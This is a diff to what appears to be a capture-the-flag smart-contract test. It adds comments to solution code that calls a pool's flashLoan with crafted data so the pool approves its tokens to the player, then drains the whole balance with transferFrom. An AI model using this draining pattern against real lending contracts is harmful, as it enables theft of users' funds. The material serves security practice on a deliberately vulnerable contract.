@@ -13,8 +13,10 @@ it('Execution', async function () {
         TOKENS_IN_POOL,
         ]);
 
+        // we will aprove 'TOKENS_IN_POOL' tokens to 'player.address' after this call
         await pool.flashLoan(0, player.address, token.address, data);
         
+        // transfer tokens from pool.address to player.address
         await token
         .connect(player)
         .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
